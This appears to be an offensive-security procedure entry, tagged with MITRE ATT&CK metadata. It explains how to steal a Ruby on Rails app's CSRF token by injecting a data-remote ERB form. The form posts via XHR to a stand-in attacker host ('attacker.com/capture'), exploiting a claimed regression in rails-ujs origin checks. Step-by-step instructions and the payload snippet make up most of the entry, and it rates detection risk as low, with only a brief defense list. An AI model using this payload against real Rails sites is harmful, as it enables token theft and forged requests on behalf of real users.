---
tags:
  - csrf
  - rails
  - form-injection
type: procedure
tools:
  - '[[tools/Sinatra]]'
tactics:
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.510Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f638d664-98b4-4e6b-9d2d-ed63aa317422
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-Data-Remote-Form-in-Rails

## Summary

This procedure involves injecting or modifying a Ruby on Rails view template to include a data-remote form that submits via XHR to an external attacker-controlled URL, causing the X-CSRF-Token header to be leaked without origin validation.

## Description

In vulnerable Ruby on Rails applications using rails-ujs, data-remote forms (with `remote: true`) perform AJAX submissions that automatically include the CSRF token in the X-CSRF-Token header. Due to a regression in the CVE-2015-1840 fix, no origin check is performed for external targets, allowing token exfiltration. This is useful in scenarios where an attacker can inject ERB templates, such as via stored XSS or server-side template injection. The outcome is the token being sent to the attacker's server, enabling subsequent request forgery.

## Requirements

1. Access to edit Rails view templates (e.g., via authenticated user with template privileges or injection vector)
2. Target Rails app version affected by the regression (pre-fix for this issue)
3. Attacker domain (e.g., http://attacker.com) for form target

## Defense

Defensive measures and detection strategies:

- Upgrade Rails to a version with proper origin checking in rails-ujs
- Implement Content Security Policy (CSP) to restrict form actions to same-origin
- Monitor for anomalous XHR requests to external domains in browser dev tools or WAF logs

## Objectives

1. Inject a form that triggers XHR submission to external endpoint
2. Ensure inclusion of X-CSRF-Token header in the request
3. Prepare for token capture on the receiving end

## Instructions

### Step 1: Identify Injection Point

**Context**: Locate a Rails view (e.g., ERB file) where you can insert the form, such as a user-editable template or via an injection vulnerability.

No specific command; review app source or use developer tools to find editable views.

### Step 2: Insert the Malicious Form

**Context**: Add the ERB form tag pointing to the external URL with remote: true to enable XHR.

Insert into the template:

```erb
<%= form_tag "http://attacker.com/capture", remote: true do %> 
  <button type="submit">Click to Leak</button> 
<% end %>
```

> This generates an HTML form that, upon submission, sends a POST XHR to the external site including the meta tag CSRF token as a header.

### Step 3: Render and Verify

**Context**: Reload the page in an authenticated session to confirm the form renders without errors.

Check Rails logs for rendering success.

**Expected Output**: Form button visible in the browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Sinatra]]

## Tags

- [[csrf]]
- [[rails]]
- [[form-injection]]
